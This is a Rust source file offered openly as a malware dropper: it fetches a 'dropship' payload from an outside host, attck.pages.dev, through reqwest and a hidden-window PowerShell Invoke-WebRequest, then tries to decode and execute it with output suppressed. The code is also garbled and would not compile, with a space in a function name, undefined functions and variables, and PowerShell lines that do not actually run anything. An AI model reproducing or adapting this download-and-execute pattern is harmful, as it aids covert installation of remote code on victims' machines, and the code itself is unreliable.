use std::io::{Read, Write};
use std::fs::File;
use std::process::{Command, Stdio};

// Function to generate AES256 encrypted dropship
fn generate_encrypted_dropship() {
    // Generate AES256 key and IV (not shown in this example)

    // Encrypt dropship using AES256
    let encrypted_dropship = encrypt_using_aes(b"dropship");

    // Write the encrypted dropship to file
    if let Err(e) = File::create("dropship.bin") {
        eprintln!("Error creating file: {}", e);
        return;
    }
    if let Err(e) = File::write("dropship.bin", dropship) {
        eprintln!("Error writing to file: {}", e);
        return;
    }
}

// Function to download and execute the encrypted dropship on target machine
fn run dropship() {
    // Download the encrypted dropship file in chunks
    let mut client = reqwest::Client::new();
    let mut file = File::open("dropship.bin").expect("Unable to open file");
    let mut chunk = vec![0; 1024]; // Assuming we're using 1KB chunks

    if let Err(e) = client.get("https://attck.pages.dev/attcks/payloads/dropship.bin")
        .send()
        .map(|response| response.copy_to(&mut chunk).text())
        .save("dropship.bin") {
        eprintln!("Error downloading file: {}", e);
        return;
    }

    // Execute the encrypted dropship file
    let output = Command::new("powershell")
        .arg("-NoP")
        .arg("-NonI")
        .arg("-W Hidden")
        .arg(format!(
            "Invoke-WebRequest -Uri {} -OutFile dropship.bin",
            "https://attck.pages.dev/attcks/payloads/dropship.bin"
        ))
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()
        .expect("Error executing PowerShell command");

    if output.status.success() {
        let output = Command::new("powershell")
            .arg("-NoP")
            .arg("-NonI")
            .arg("-W Hidden")
            .arg(format!("$bytes=[System.Text.Encoding]::UTF8.GetBytes([System.Convert]::FromBase64String(Get-Content dropship.bin | ForEach-Object { if ($_ -eq $null) {} else { [System.Web.HttpUtility]::UrlEncode($_) }})); [byte[]]($bytes); i = 0; while (i -lt $bytes.Length) {{ $i++ }}"))
            .arg("-ExecuteByPass")
            .arg("-NoExit")
            .arg("dropship.bin")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .output()
            .expect("Error executing PowerShell command");

        if let Ok(output) = output {
            // Check if the download and execution were successful
            if output.status.success() {
                println!("Download and execution successful!");
            } else {
                println!("Download or execution failed!");
            }
        } else {
            println!("Error executing PowerShell command!");
        }
    } else {
        println!("Download failed!");
    }
}

fn main() {
    generate_encrypted_dropship();
    run_encrypted_dropship();
}